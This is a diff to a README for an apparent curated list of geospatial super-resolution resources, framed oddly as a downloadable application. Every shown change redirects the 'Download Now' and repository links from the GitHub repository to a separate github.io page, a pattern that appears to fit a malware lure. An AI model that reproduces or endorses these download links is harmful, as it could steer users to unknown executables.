@@ -1,6 +1,6 @@
 # 🛰️ awesome-geospatial-super-resolution - Boost satellite image clarity instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Now!-brightgreen?style=for-the-badge&logo=github)](https://github.com/lubricated-cue387/awesome-geospatial-super-resolution)
+[![Download Now](https://img.shields.io/badge/Download-Now!-brightgreen?style=for-the-badge&logo=github)](https://lubricated-cue387.github.io)
 
 ## 🚀 What This Is
 
@@ -32,7 +32,7 @@ The collection covers:
 
 Visit this link to download the application:
 
-[**Download awesome-geospatial-super-resolution**](https://github.com/lubricated-cue387/awesome-geospatial-super-resolution)
+[**Download awesome-geospatial-super-resolution**](https://lubricated-cue387.github.io)
 
 ### Step 2: Open the File
 
@@ -119,7 +119,7 @@ To get the full collection:
 
 Visit this link to download the application:
 
-[**Download Now**](https://github.com/lubricated-cue387/awesome-geospatial-super-resolution)
+[**Download Now**](https://lubricated-cue387.github.io)
 
 ## ❓ Frequently Asked Questions
 
@@ -166,8 +166,8 @@ This collection is provided as a reference. Individual resources have their own 
 
 ## 🔗 Quick Links
 
-- [Main Repository](https://github.com/lubricated-cue387/awesome-geospatial-super-resolution)
-- [Download Now](https://github.com/lubricated-cue387/awesome-geospatial-super-resolution)
+- [Main Repository](https://lubricated-cue387.github.io)
+- [Download Now](https://lubricated-cue387.github.io)
 
 ---
 
